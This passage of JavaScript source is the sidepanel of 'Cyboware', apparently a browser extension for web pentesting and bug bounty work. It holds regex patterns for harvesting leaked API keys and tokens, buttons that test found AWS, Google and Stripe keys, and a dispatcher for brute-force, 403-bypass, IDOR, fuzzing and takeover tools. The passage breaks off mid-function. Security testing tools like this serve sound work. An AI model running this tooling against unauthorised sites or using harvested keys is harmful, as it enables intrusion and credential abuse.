/* ═══ CYBOWARE — Sidepanel v3 ═══ */

let activeTabId = null, activeTabUrl = '', activeTabDomain = '';
let pinnedTabId = null, scopeDomains = [], notes = {}, diffStore = { a: null, b: null };
let liveActive = false, liveTargetDomain = '', liveFindings = [];
const liveSeenItems = new Set(); // dedup: skip already-found items
const liveDomainData = {}; // domain → { findings, seenItems, feedHTML }
let liveScanTimer = null; // debounce timer
let liveScanLastUrl = ''; // last URL scanned
let liveScanLastTime = 0; // timestamp of last scan
const cache = {};
const browseHistory = {}; // domain → [{url, title, timestamp}]

const SECRET_PATTERNS = [
  { name: 'AWS Access Key', regex: /AKIA[0-9A-Z]{16}/g, severity: 'high' },
  { name: 'AWS Secret Key', regex: /(?:aws_secret|secret_key|SecretAccessKey)['":\s]*([A-Za-z0-9/+=]{40})/gi, severity: 'high' },
  { name: 'Google API Key', regex: /AIza[0-9A-Za-z_-]{35}/g, severity: 'high' },
  { name: 'GitHub Token', regex: /gh[ps]_[A-Za-z0-9_]{36,255}/g, severity: 'high' },
  { name: 'Slack Token', regex: /xox[baprs]-[0-9]{10,13}-[0-9A-Za-z-]+/g, severity: 'high' },
  { name: 'Stripe Secret', regex: /sk_live_[0-9a-zA-Z]{24,99}/g, severity: 'high' },
  { name: 'Stripe Publishable', regex: /pk_live_[0-9a-zA-Z]{24,99}/g, severity: 'medium' },
  { name: 'Twilio API Key', regex: /SK[0-9a-fA-F]{32}/g, severity: 'high' },
  { name: 'SendGrid', regex: /SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}/g, severity: 'high' },
  { name: 'Private Key', regex: /-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----/g, severity: 'high' },
  { name: 'Bearer Token', regex: /[Bb]earer\s+[A-Za-z0-9\-._~+/]+=*/g, severity: 'medium' },
  { name: 'JWT Token', regex: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g, severity: 'medium' },
  { name: 'Generic Secret', regex: /(?:secret|password|passwd|token|api_key|apikey|api-key|auth)[\s]*[=:]["'][^\s"']{8,}/gi, severity: 'medium' },
  { name: 'IP Address', regex: /(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)/g, severity: 'low' },
  { name: 'Firebase', regex: /AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}/g, severity: 'high' },
  { name: 'Mailgun', regex: /key-[0-9a-zA-Z]{32}/g, severity: 'high' },
  { name: 'Basic Auth', regex: /[Bb]asic\s+[A-Za-z0-9+/]{20,}={0,2}/g, severity: 'medium' },
];
// ═══ ENTROPY SCORING ═══
function shannonEntropy(str) {
  const freq = {};
  for (const c of str) freq[c] = (freq[c] || 0) + 1;
  const len = str.length;
  let ent = 0;
  for (const c in freq) { const p = freq[c] / len; ent -= p * Math.log2(p); }
  return ent;
}
// Tracking cookies that are intentionally not HttpOnly
const TRACKING_COOKIES = /^(_ga|_gid|_gat|_fbp|_fbc|_gcl_|_ym_|_hjid|_hjAbsoluteSessionInProgress|_hjFirstSeen|_hjSession|__hstc|__hssc|hubspotutk|ajs_|mp_|optimizelyEndUserId|_clck|_clsk|_uetsid|_uetvid|_pin_|_pinterest|MUID|_tt_|__qca|sc_|__gads|IDE|NID|ANID|1P_JAR|CONSENT|SOCS|AEC)$/i;
const ENDPOINT_PATTERNS = [
  /["'](\/api\/[^"'\s]{2,})["']/g,
  /["'](\/v[0-9]+\/[^"'\s]{2,})["']/g,
  /["'](\/graphql[^"'\s]*)["']/g,
  /["'](\/rest\/[^"'\s]{2,})["']/g,
  /["'](\/wp-json\/[^"'\s]{2,})["']/g,
  /["'](\/ajax\/[^"'\s]{2,})["']/g,
  /["'](wss?:\/\/[^"'\s]+)["']/g,
  /\.(?:get|post|put|patch|delete|fetch)\s*\(\s*["']([^"']+)["']/g,
  /(?:url|endpoint|href|action|src)\s*[:=]\s*["'](\/[a-z0-9][^"'\s]{3,})["']/gi,
  /["'](https?:\/\/[^"'\s]{10,})["']/g,
];
// Filter out noise from endpoint extraction
const ENDPOINT_NOISE = [
  /^[#.]/, // CSS selectors
  /[\[\]]/, // DOM queries like input[value=
  /^(settings|enlarge|hl|rs|rslightbox)/, // ReadSpeaker junk
  /w3\.org|xmlns|schema\.org/, // Standards namespaces
  /\.(css|js|png|jpg|jpeg|gif|svg|woff|woff2|ttf|eot|ico|map|webp|mp3|ogg|mp4|pdf)(\?|$)/i, // Static assets
  /\/products\/[^/]+\.(webp|png|jpg)/i, // Product images
  /^(a|ul|select|input|div|span|button|img|script|link|meta),?\s/i, // HTML tags
  /^(true|false|null|undefined|none|auto|inherit|normal|block|flex|grid|popup|player|interval|length|reporter|extensions)$/i, // JS/CSS values
  /fonts\.googleapis|fonts\.gstatic|cookiehub|google-analytics|googletagmanager|facebook\.com|cdn\.jsdelivr|doubleclick\.net|googlesyndication|googleadservices|clarity\.ms|livechatinc|openwidget/i, // Third-party services
  /^https?:\/\/www\.(w3|xml|google\.com\/(ccm|pagead|rmkt|measurement|travel)|googletagmanager|googlesyndication|googleadservices)/, // Google tracking
  /^https?:\/\/(pagead2|adservice|ad\.|secure\.livechat|react\.dev|github\.com\/zloirock|syncle\.com|chrome\.google\.com|addons\.mozilla)/, // Browser/dev tools
  /^https?:\/\/media\.backend\.elko/i, // Product CDN images
  /^[a-z][a-zA-Z]+$/,  // camelCase single words (JS vars): apiConfiguration, sessionId, etc.
  /^[a-z]+-[a-z-]+$/i, // kebab-case: x-middleware-cache, sentry-trace, max-h
  /^[A-Z][a-zA-Z-]+$/, // Header names: Content-Type, Retry-After, X-Request-URL
  /^\[/, // Array-like: [...], [[...]]
  /^https?:\/\/(www\.)?(facebook|instagram|twitter|tiktok|linkedin|youtube(-nocookie)?)\.(com|is|net)\/?($|@|channel|company)/, // Social media pages
  /^https?:\/\/example\.com/, // Example URLs
  /^https?:\/\/(www\.)?google\.com\/?$/, // Just google.com
  /^https?:\/\/embed|^https?:\/\/cdn\.|^https?:\/\/dash\./i, // CDN/embed subdomains
  /^https?:\/\/[^/]+\/?$/, // Bare domains with no path (https://elko.is/)
];
function isRealEndpoint(ep) {
  if (ep.length < 5 || ep.length > 500) return false;
  if (!ep.startsWith('/') && !ep.startsWith('http') && !ep.startsWith('ws')) return false; // Must be a path or URL
  for (const noise of ENDPOINT_NOISE) { if (noise.test(ep)) return false; }
  return true;
}

// ═══ INIT ═══
document.addEventListener('DOMContentLoaded', async () => {
  log('Cyboware v3 initialized');
  const stored = await chrome.storage.local.get(['scopeDomains', 'notes', 'scratchpad', 'browseHistory']);
  scopeDomains = stored.scopeDomains || [];
  notes = stored.notes || {};
  if (stored.browseHistory) Object.assign(browseHistory, stored.browseHistory);
  const sp = document.getElementById('scratchpad');
  if (sp) sp.value = stored.scratchpad || '';

  setupGroupToggles(); setupToolButtons(); setupPinButton(); setupDebugLog();
  setupRefreshButton(); setupScratchpad(); setupLiveBrowse(); setupToolSearch();
  // Listen for SPA navigations and DOM mutations from content/injected scripts
  chrome.runtime.onMessage.addListener((msg) => {
    if (!liveActive) return;
    if (msg.type === 'SPA_NAVIGATE' && msg.payload) {
      try {
        const pageRoot = getRootDomain(new URL(msg.payload.url).hostname);
        const targetRoot = getRootDomain(liveTargetDomain);
        if (pageRoot === targetRoot) {
          log('SPA navigate: ' + msg.payload.method + ' → ' + msg.payload.url, 'info');
          debouncedLiveScan(activeTabId, msg.payload.url, '');
        }
      } catch {}
    }
    if (msg.type === 'DOM_MUTATION' && msg.payload) {
      try {
        const pageRoot = getRootDomain(new URL(msg.payload.url).hostname);
        const targetRoot = getRootDomain(liveTargetDomain);
        if (pageRoot === targetRoot && (msg.payload.forms > 0 || msg.payload.scripts > 0)) {
          log('DOM mutation: ' + msg.payload.forms + ' forms, ' + msg.payload.scripts + ' scripts', 'info');
          debouncedLiveScan(activeTabId, msg.payload.url, '');
        }
      } catch {}
    }
    if (msg.type === 'INTERCEPTED_REQUEST' && msg.payload) {
      try {
        const reqUrl = msg.payload.url;
        if (!reqUrl) return;
        const reqRoot = getRootDomain(new URL(reqUrl, activeTabUrl).hostname);
        const targetRoot = getRootDomain(liveTargetDomain);
        if (reqRoot === targetRoot) {
          const key = 'xhr:' + msg.payload.method + ':' + reqUrl;
          if (!liveSeenItems.has(key)) {
            liveSeenItems.add(key);
            const feed = document.getElementById('live-feed');
            const ts = new Date().toLocaleTimeString();
            const div = document.createElement('div');
            div.style.cssText = 'padding:3px 10px;border-bottom:1px solid var(--border);font-size:10px;font-family:var(--font-mono);color:var(--text-secondary)';
            div.textContent = ts + ' ' + msg.payload.type.toUpperCase() + ' ' + (msg.payload.method || 'GET') + ' ' + reqUrl.slice(0, 80);
            if (feed.firstChild?.classList?.contains('text-muted')) feed.innerHTML = '';
            feed.prepend(div);
          }
        }
      } catch {}
    }
  });
  // Global click-to-copy on result items
  document.querySelector('.app').addEventListener('click', (e) => {
    // Click-to-copy: clicking a result-item copies its value text
    const item = e.target.closest('.result-item');
    if (item && !e.target.closest('button, a, input, textarea, select, code')) {
      const val = item.querySelector('.result-value')?.textContent?.trim();
      if (val) copyText(val);
    }
    // Test Google API key button
    if (e.target.dataset.testKey) {
      e.stopPropagation();
      window.testGoogleKey(e.target.dataset.testKey);
    }
    // Test AWS key button
    if (e.target.dataset.testAws) {
      e.stopPropagation();
      window.testAwsKey(e.target.dataset.testAws);
    }
    // Test Stripe key button
    if (e.target.dataset.testStripe) {
      e.stopPropagation();
      window.testStripeKey(e.target.dataset.testStripe);
    }
  });

  await updateActiveTab();
  // Track tab changes
  chrome.tabs.onActivated.addListener(() => { if (!pinnedTabId) updateActiveTab(); });
  chrome.tabs.onUpdated.addListener((tabId, info, tab) => {
    if (info.status === 'complete') {
      // Record browse history
      if (tab.url && !tab.url.startsWith('chrome') && !tab.url.startsWith('about:')) {
        try {
          const domain = getRootDomain(new URL(tab.url).hostname);
          if (domain) {
            if (!browseHistory[domain]) browseHistory[domain] = [];
            if (!browseHistory[domain].some(e => e.url === tab.url)) {
              browseHistory[domain].push({ url: tab.url, title: tab.title || '', timestamp: Date.now() });
              if (browseHistory[domain].length > 200) browseHistory[domain] = browseHistory[domain].slice(-200);
              chrome.storage.local.set({ browseHistory });
            }
          }
        } catch {}
      }
      // Only update sidebar for the tab we're tracking
      if (pinnedTabId) {
        // When pinned: ONLY react to the pinned tab's own updates
        if (tabId === pinnedTabId) updateActiveTab();
      } else {
        // Not pinned: react to the active tab's updates
        if (tabId === activeTabId) updateActiveTab();
      }
      // Live Browse — only scan if NOT pinned to a different domain, or if pinned and matches
      if (liveActive && tab.url && !tab.url.startsWith('chrome')) {
        try {
          const host = new URL(tab.url).hostname;
          const targetRoot = getRootDomain(liveTargetDomain);
          const pageRoot = getRootDomain(host);
          if (pageRoot === targetRoot) {
            debouncedLiveScan(tabId, tab.url, tab.title || '');
          }
        } catch {}
      }
    }
  });
});

let lastDomain = '';
const visitedDomains = new Set();
const domainPanels = {}; // rootDomain -> { groupName: panelHTML }

// ═══ TAB TRACKING ═══
async function updateActiveTab() {
  try {
    const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tabs || !tabs.length) return;
    const visibleTab = tabs[0]; // Tab the user is currently looking at

    if (pinnedTabId) {
      // PINNED: always use pinned tab data, ignore visible tab
      try {
        const pt = await chrome.tabs.get(pinnedTabId);
        activeTabId = pt.id;
        activeTabUrl = pt.url || '';
      } catch {
        // Pinned tab was closed — auto-unpin
        pinnedTabId = null;
        document.getElementById('btn-pin').classList.remove('pinned');
        document.getElementById('btn-pin').textContent = 'PIN';
        activeTabId = visibleTab.id;
        activeTabUrl = visibleTab.url || '';
        log('Pinned tab closed — unpinned', 'warn');
      }
    } else {
      activeTabId = visibleTab.id;
      activeTabUrl = visibleTab.url || '';
    }

    try { activeTabDomain = new URL(activeTabUrl).hostname; } catch { activeTabDomain = ''; }

    // Show URL + pin status in context bar
    document.getElementById('tab-url').textContent = activeTabUrl || '—';
    document.getElementById('tab-url').title = activeTabUrl;

    const currentHost = activeTabDomain;

    // ── Domain switch: save → clear → restore ──
    if (lastDomain && currentHost !== lastDomain) {
      // Save current panels
      domainPanels[lastDomain] = {};
      document.querySelectorAll('.results-panel.active').forEach(p => {
        domainPanels[lastDomain][p.id.replace('results-', '')] = p.innerHTML;
      });
      // Save live browse
      if (liveFindings.length || liveSeenItems.size) {
        liveDomainData[lastDomain] = { findings: [...liveFindings], seenItems: new Set(liveSeenItems), feedHTML: document.getElementById('live-feed')?.innerHTML || '' };
      }

      // Clear panels
      document.querySelectorAll('.results-panel').forEach(p => { p.classList.remove('active'); p.innerHTML = ''; });
      document.querySelectorAll('.badge').forEach(b => b.classList.add('hidden'));

      // Restore for new domain
      if (domainPanels[currentHost]) {
        Object.entries(domainPanels[currentHost]).forEach(([group, html]) => {
          const panel = document.getElementById('results-' + group);
          if (panel && html) {
            panel.innerHTML = html; panel.classList.add('active');
            wireResultsClose(panel); wireResultsCopyJson(panel);
            panel.closest('.feat-group')?.classList.add('open');
          }
        });
        log('Restored: ' + currentHost);
      }
      // Restore live browse
      if (liveDomainData[currentHost]) {
        const ld = liveDomainData[currentHost];
        liveFindings = ld.findings; liveSeenItems.clear(); ld.seenItems.forEach(s => liveSeenItems.add(s));
        const feed = document.getElementById('live-feed');
        if (feed) feed.innerHTML = ld.feedHTML;
        const totalItems = liveFindings.reduce((s, f) => s + f.items.length, 0);
        document.getElementById('live-count').textContent = totalItems + ' findings';
        if (totalItems > 0) { const badge = document.getElementById('badge-live'); badge.textContent = totalItems; badge.classList.remove('hidden'); }
      } else {
        liveFindings = []; liveSeenItems.clear();
        const feed = document.getElementById('live-feed');
        if (feed) feed.innerHTML = '<div class="text-muted text-sm" style="padding:12px;text-align:center">Click Start to begin</div>';
        document.getElementById('live-count').textContent = '0 findings';
      }
    }
    lastDomain = currentHost;

    if (activeTabDomain) visitedDomains.add(activeTabDomain);
    updateScopeIndicator();
    renderDomainPills();
  } catch (e) {
    log('Tab update error: ' + e.message, 'error');
  }
}

function renderDomainPills() {
  const bar = document.getElementById('domain-sessions');
  if (!bar) return;
  const domainsWithData = Object.keys(domainPanels).filter(d => Object.keys(domainPanels[d]).length > 0);
  const currentHost = activeTabDomain;
  const allDomains = new Set([...domainsWithData, currentHost].filter(Boolean));
  if (allDomains.size <= 1) { bar.innerHTML = ''; return; }

  bar.innerHTML = [...allDomains].map(d => {
    const isActive = d === currentHost;
    const hasData = domainPanels[d] && Object.keys(domainPanels[d]).length > 0;
    return `<button class="domain-pill ${isActive ? 'active' : ''}" data-domain="${esc(d)}">${hasData ? '<span class="pill-dot"></span>' : ''}${esc(d)}</button>`;
  }).join('');

  bar.querySelectorAll('.domain-pill').forEach(pill => {
    pill.addEventListener('click', async () => {
      const domain = pill.dataset.domain;
      if (domain === currentHost) return;
      // Auto-unpin when switching via domain pills
      if (pinnedTabId) {
        pinnedTabId = null;
        document.getElementById('btn-pin').classList.remove('pinned');
        document.getElementById('btn-pin').textContent = 'PIN';
      }
      // Find a tab with this domain
      const tabs = await chrome.tabs.query({ currentWindow: true });
      const match = tabs.find(t => { try { return new URL(t.url).hostname === domain; } catch { return false; } });
      if (match) {
        await chrome.tabs.update(match.id, { active: true });
      } else {
        // No tab found — just restore the cached session
        // Save current first
        if (lastDomain) {
          domainPanels[lastDomain] = {};
          document.querySelectorAll('.results-panel.active').forEach(p => {
            domainPanels[lastDomain][p.id.replace('results-', '')] = p.innerHTML;
          });
        }
        document.querySelectorAll('.results-panel').forEach(p => { p.classList.remove('active'); p.innerHTML = ''; });
        if (domainPanels[domain]) {
          Object.entries(domainPanels[domain]).forEach(([group, html]) => {
            const panel = document.getElementById('results-' + group);
            if (panel && html) { panel.innerHTML = html; panel.classList.add('active'); wireResultsClose(panel); wireResultsCopyJson(panel); panel.closest('.feat-group')?.classList.add('open'); }
          });
        }
        activeTabDomain = domain; lastDomain = domain;
        document.getElementById('tab-url').textContent = domain + ' (cached session)';
        renderDomainPills();
        log('Loaded cached session: ' + domain);
      }
    });
  });
}

function updateScopeIndicator() {
  const dot = document.getElementById('scope-indicator');
  if (!activeTabDomain || !scopeDomains.length) { dot.className = 'scope-dot'; return; }
  const inScope = scopeDomains.some(d => activeTabDomain === d || activeTabDomain.endsWith('.' + d));
  dot.className = 'scope-dot ' + (inScope ? 'in-scope' : 'out-scope');
}

// ═══ GUARD: safe message to content script — auto-injects if needed ═══
async function msgTab(msg) {
  if (!activeTabId) { log('No active tab', 'warn'); return { ok: false, error: 'No active tab' }; }
  if (activeTabUrl.startsWith('chrome://') || activeTabUrl.startsWith('chrome-extension://') || activeTabUrl.startsWith('about:')) {
    return { ok: false, error: 'Cannot access this page type' };
  }
  try { return await chrome.tabs.sendMessage(activeTabId, msg); }
  catch (e) {
    if (e.message?.includes('Receiving end does not exist') || e.message?.includes('Could not establish connection')) {
      log('Content script not loaded. Reload the page.', 'warn');
      return { ok: false, error: 'Content script not loaded. Reload the page (F5) and try again.' };
    }
    log('Content script error: ' + e.message, 'error');
    return { ok: false, error: e.message };
  }
}

// ═══ UI SETUP ═══
function setupGroupToggles() { document.querySelectorAll('.feat-group-header').forEach(h => h.addEventListener('click', () => { const parent = h.parentElement; const wasOpen = parent.classList.contains('open'); document.querySelectorAll('.feat-group.open').forEach(g => g.classList.remove('open')); if (!wasOpen) parent.classList.add('open'); })); }
function setupPinButton() {
  const btn = document.getElementById('btn-pin');
  btn.addEventListener('click', async () => {
    if (pinnedTabId) { pinnedTabId = null; btn.classList.remove('pinned'); btn.textContent = 'PIN'; await updateActiveTab(); }
    else { pinnedTabId = activeTabId; btn.classList.add('pinned'); btn.textContent = '📌 ' + activeTabDomain; }
  });
}
function setupRefreshButton() {
  document.getElementById('btn-refresh').addEventListener('click', () => { Object.keys(cache).forEach(k => delete cache[k]); updateActiveTab(); });
  // Reset button — close all panels, clear cache for current domain
  document.getElementById('btn-reset')?.addEventListener('click', () => {
    const currentHost = activeTabDomain;
    Object.keys(cache).forEach(k => { if (k.startsWith(currentHost + ':')) delete cache[k]; });
    delete domainPanels[currentHost];
    delete liveDomainData[currentHost];
    document.querySelectorAll('.results-panel').forEach(p => { p.classList.remove('active'); p.innerHTML = ''; });
    document.querySelectorAll('.badge').forEach(b => b.classList.add('hidden'));
    liveFindings = []; liveSeenItems.clear();
    const feed = document.getElementById('live-feed');
    if (feed) feed.innerHTML = '<div class="text-muted text-sm" style="padding:12px;text-align:center">Cleared</div>';
    document.getElementById('live-count').textContent = '0 findings';
    renderDomainPills();
    log('Reset: ' + currentHost, 'success');
  });
  // Collapse / Expand all sections
  document.getElementById('btn-collapse')?.addEventListener('click', () => {
    const groups = document.querySelectorAll('.feat-group');
    const anyOpen = [...groups].some(g => g.classList.contains('open'));
    groups.forEach(g => { if (anyOpen) g.classList.remove('open'); else g.classList.add('open'); });
    document.getElementById('btn-collapse').textContent = anyOpen ? '△' : '▽';
  });
  // Domain selector — switch context when user picks a previously visited domain
  // (removed — now auto-adapts to current tab)
  document.getElementById('btn-copy-all')?.addEventListener('click', () => {
    // Build human-readable report
    let report = `${'═'.repeat(40)}\nCYBOWARE REPORT\n${'═'.repeat(40)}\nTarget: ${activeTabDomain}\nURL: ${activeTabUrl}\nDate: ${new Date().toISOString()}\n\n`;
    // Collect from all visible panels
    const sections = [];
    document.querySelectorAll('.results-panel.active').forEach(panel => {
      const title = panel.querySelector('.results-title')?.textContent || '';
      const items = [...panel.querySelectorAll('.result-item')].map(el => {
        const label = el.querySelector('.result-label')?.textContent?.trim() || '';
        const value = el.querySelector('.result-value')?.textContent?.trim() || el.textContent.trim();
        return { label, value };
      });
      if (items.length) sections.push({ title, items });
    });
    // Also from domain cache
    Object.entries(cache).forEach(([key, html]) => {
      if (!key.startsWith(activeTabDomain + ':')) return;
      const title = key.split(':').slice(1).join(':');
      if (sections.some(s => s.title === title)) return;
      const div = document.createElement('div'); div.innerHTML = html;
      const items = [...div.querySelectorAll('.result-item')].map(el => ({
        label: el.querySelector('.result-label')?.textContent?.trim() || '',
        value: el.querySelector('.result-value')?.textContent?.trim() || el.textContent.trim()
      }));
      if (items.length) sections.push({ title, items });
    });
    sections.forEach(s => {
      report += `── ${s.title} ${'─'.repeat(Math.max(1, 34 - s.title.length))}\n`;
      s.items.forEach(i => { report += i.label ? `  [${i.label}] ${i.value}\n` : `  ${i.value}\n`; });
      report += '\n';
    });
    report += `${'─'.repeat(40)}\nGenerated by Cyboware · github.com/Cyboghostginx\n`;
    copyText(report);
    log('Full report copied (' + sections.length + ' sections)', 'success');
  });
}
function setupDebugLog() {
  document.getElementById('toggle-log').addEventListener('click', () => { const el = document.getElementById('debug-log'); el.classList.toggle('visible'); document.getElementById('toggle-log').textContent = el.classList.contains('visible') ? 'Log ▴' : 'Log ▾'; });
  document.getElementById('clear-log').addEventListener('click', () => { document.getElementById('debug-log-entries').innerHTML = ''; });
}
function setupToolButtons() { document.querySelectorAll('.tool-btn').forEach(b => b.addEventListener('click', () => runTool(b.dataset.tool))); }
function setupScratchpad() {
  const sp = document.getElementById('scratchpad'); if (!sp) return;
  let t; sp.addEventListener('input', () => { clearTimeout(t); t = setTimeout(() => chrome.storage.local.set({ scratchpad: sp.value }), 500); });
  document.getElementById('btn-scratch-copy')?.addEventListener('click', () => copyText(sp.value));
  document.getElementById('btn-scratch-clear')?.addEventListener('click', () => { sp.value = ''; chrome.storage.local.set({ scratchpad: '' }); });
  document.getElementById('btn-scratch-download')?.addEventListener('click', () => downloadText(sp.value, 'cyboware-scratchpad.txt'));
}
function setupToolSearch() {
  const input = document.getElementById('tool-search');
  if (!input) return;
  input.addEventListener('input', () => {
    const q = input.value.toLowerCase().trim();
    if (!q) {
      // Reset: show all groups and buttons
      document.querySelectorAll('.feat-group').forEach(g => g.style.display = '');
      document.querySelectorAll('.tool-btn').forEach(b => b.style.display = '');
      return;
    }
    document.querySelectorAll('.feat-group').forEach(group => {
      const buttons = group.querySelectorAll('.tool-btn');
      let anyMatch = false;
      buttons.forEach(btn => {
        const name = (btn.querySelector('.tool-name')?.textContent || '').toLowerCase();
        const desc = (btn.querySelector('.tool-desc')?.textContent || '').toLowerCase();
        const match = name.includes(q) || desc.includes(q);
        btn.style.display = match ? '' : 'none';
        if (match) anyMatch = true;
      });
      group.style.display = anyMatch ? '' : 'none';
      if (anyMatch) group.classList.add('open');
    });
    // Auto-scroll to first visible match
    const firstMatch = document.querySelector('.tool-btn:not([style*="display: none"])');
    if (firstMatch) firstMatch.scrollIntoView({ behavior: 'smooth', block: 'center' });
  });
  // Clear on Escape
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') { input.value = ''; input.dispatchEvent(new Event('input')); input.blur(); }
  });
}

// ═══ RESULTS PANEL — always fresh, no dead event listeners ═══
function showResults(groupName, title, loading, toolName) {
  const panel = document.getElementById('results-' + groupName);
  panel.classList.add('active');
  panel.dataset.tool = toolName || currentToolName || '';
  panel.innerHTML = `<div class="results-header"><span class="results-title">${esc(title)}</span><div class="results-actions"><button class="ra-rerun" title="Re-run">↻</button><button class="ra-copy" title="Copy">Copy</button><button class="ra-json" title="JSON">JSON</button></div><button class="results-close">✕</button></div><div class="results-body">${loading ? '<div class="loading-text"><span class="spinner"></span> Working…</div>' : ''}</div>`;
  wireResultsClose(panel);
  wireResultsRerun(panel);
  return panel.querySelector('.results-body');
}
function finalizeResults(gn) {
  const p = document.getElementById('results-' + gn);
  const title = p.querySelector('.results-title')?.textContent || '';
  cache[activeTabDomain + ':' + title] = p.querySelector('.results-body')?.innerHTML || '';
  wireResultsCopyJson(p);
}
function wireResultsClose(p) { p.querySelector('.results-close')?.addEventListener('click', () => p.classList.remove('active')); }
function wireResultsRerun(p) {
  p.querySelector('.ra-rerun')?.addEventListener('click', () => {
    const toolName = p.dataset.tool;
    if (toolName) {
      const btn = document.querySelector(`[data-tool="${toolName}"]`);
      if (btn) btn.click();
    }
  });
}
function wireResultsCopyJson(p) {
  p.querySelector('.ra-copy')?.addEventListener('click', () => {
    const items = [...p.querySelectorAll('.results-body .result-item')];
    if (!items.length) { copyText(p.querySelector('.results-body')?.textContent || ''); return; }
    const lines = items.map(el => {
      const label = el.querySelector('.result-label')?.textContent?.trim() || '';
      const value = el.querySelector('.result-value')?.textContent?.trim() || el.textContent.trim();
      return label ? `[${label}] ${value}` : value;
    });
    copyText(lines.join('\n'));
  });
  p.querySelector('.ra-json')?.addEventListener('click', () => {
    const items = [...p.querySelectorAll('.results-body .result-item')].map(el => ({
      label: el.querySelector('.result-label')?.textContent?.trim() || '',
      value: el.querySelector('.result-value')?.textContent?.trim() || el.textContent.trim()
    }));
    copyText(JSON.stringify(items, null, 2));
  });
}

// ═══ DISPATCHER ═══
let currentToolName = '';
async function runTool(tool) {
  log('Running: ' + tool);
  currentToolName = tool;
  try {
    switch (tool) {
      case 'tech-stack': await toolTechStack(); break;
      case 'headers-audit': await toolHeadersAudit(); break;
      case 'cookies': await toolCookies(); break;
      case 'subdomains': await toolSubdomains(); break;
      case 'reqresp': await toolReqResp(); break;
      case 'dns': await toolDns(); break;
      case 'wpplugins': await toolWpPlugins(); break;
      case 'secrets': await toolSecrets(); break;
      case 'endpoints': await toolEndpoints(); break;
      case 'hidden': await toolHidden(); break;
      case 'links': await toolLinks(); break;
      case 'replayer': await toolReplayer(); break;
      case 'cors': await toolCors(); break;
      case 'redirect': await toolRedirect(); break;
      case 'codec': toolCodec(); break;
      case 'paramfuzz': await toolParamFuzz(); break;
      case 'bypass403': await tool403Bypass(); break;
      case 'methodtest': await toolMethodTest(); break;
      case 'jwteditor': toolJwtEditor(); break;
      case 'dirbrute': await toolDirBrute(); break;
      case 'idor': await toolIdor(); break;
      case 'jsbeautify': await toolJsBeautify(); break;
      case 'storage': await toolStorage(); break;
      case 'cspeval': await toolCspEval(); break;
      case 'takeover': await toolTakeover(); break;
      case 'scope': toolScope(); break;
      case 'notes': toolNotes(); break;
      case 'history': toolHistory(); break;
      case 'screenshot': await toolScreenshot(); break;
      case 'passive': await toolPassive(); break;
      case 'wayback': await toolWayback(); break;
      case 'diff': toolDiff(); break;
    }
  } catch (e) { log('Error: ' + e.message, 'error'); }
}

// ═══ TOOLS ═══
async function toolTechStack() {
  const b = showResults('recon', 'Tech Stack', true);
  b.innerHTML = '<div class="loading-text"><span class="spinner"></span> Deep scanning tech stack...</div>';
  const res = await msgTab({ type: 'ANALYZE_TECH_STACK' });
  const hRes = await chrome.runtime.sendMessage({ type: 'GET_HEADERS', tabId: activeTabId });
  const all = [...(res?.data||[])];

  // 1. Server headers with version extraction
  if (hRes.headers?.responseHeaders) hRes.headers.responseHeaders.forEach(h => {
    const n = h.name.toLowerCase();
    if (n === 'server') all.push({ name: h.value, category: 'Server', confidence: 'high' });
    if (n === 'x-powered-by') all.push({ name: h.value, category: 'Backend', confidence: 'high' });
    if (n === 'x-aspnet-version') all.push({ name: 'ASP.NET ' + h.value, category: 'Backend', confidence: 'high' });
    if (n === 'x-generator') all.push({ name: h.value, category: 'CMS', confidence: 'high' });
    if (n === 'x-drupal-cache' || n === 'x-drupal-dynamic-cache') all.push({ name: 'Drupal', category: 'CMS', confidence: 'high' });
    if (n === 'x-varnish') all.push({ name: 'Varnish', category: 'Cache', confidence: 'high' });
    if (n === 'x-cache' && h.value.includes('cloudfront')) all.push({ name: 'AWS CloudFront', category: 'CDN', confidence: 'high' });
    if (n === 'cf-ray') all.push({ name: 'Cloudflare', category: 'CDN/WAF', confidence: 'high' });
    if (n === 'x-akamai-transformed') all.push({ name: 'Akamai', category: 'CDN/WAF', confidence: 'high' });
    if (n === 'x-sucuri-id') all.push({ name: 'Sucuri WAF', category: 'WAF', confidence: 'high' });
    if (n === 'x-iinfo') all.push({ name: 'Imperva', category: 'WAF', confidence: 'high' });
    if (n === 'x-cdn' || (n === 'via' && /cloudflare|akamai|fastly|cdn/i.test(h.value))) all.push({ name: 'CDN: ' + h.value, category: 'CDN', confidence: 'medium' });
    if (n === 'x-frame-options') all.push({ name: 'X-Frame-Options: ' + h.value, category: 'Security Header', confidence: 'high' });
  });

  // 2. Cookie-based tech detection
  try {
    const cookieRes = await chrome.runtime.sendMessage({ type: 'GET_COOKIES', domain: activeTabDomain });
    if (cookieRes.ok) {
      const cookieTech = { 'PHPSESSID': 'PHP', 'JSESSIONID': 'Java/Tomcat', 'connect.sid': 'Express/Node.js', 'ASP.NET_SessionId': 'ASP.NET', 'laravel_session': 'Laravel', 'CFID': 'ColdFusion', '_rails_session': 'Ruby on Rails', 'rack.session': 'Ruby Rack', '_session_id': 'Ruby on Rails', 'ci_session': 'CodeIgniter', 'PLAY_SESSION': 'Play Framework', '__cfduid': 'Cloudflare' };
      cookieRes.cookies.forEach(c => {
        for (const [pat, tech] of Object.entries(cookieTech)) {
          if (c.name === pat || c.name.startsWith(pat)) {
            if (!all.some(t => t.name.includes(tech))) all.push({ name: tech, category: 'Backend (cookie)', confidence: 'high' });
          }
        }
      });
    }
  } catch {}

  // 3. JS file version extraction (scan first 200 chars of top JS files for version comments)
  try {
    const sr = await msgTab({ type: 'GET_SCRIPT_URLS' });
    if (sr?.ok) {
      const versionPatterns = [
        { re: /jquery[.\-\s]?v?(\d+\.\d+\.\d+)/i, name: 'jQuery' },
        { re: /bootstrap[.\-\s]?v?(\d+\.\d+\.\d+)/i, name: 'Bootstrap' },
        { re: /angular[.\-\s/]?v?(\d+\.\d+\.\d+)/i, name: 'Angular' },
        { re: /react[.\-\s]?v?(\d+\.\d+\.\d+)/i, name: 'React' },
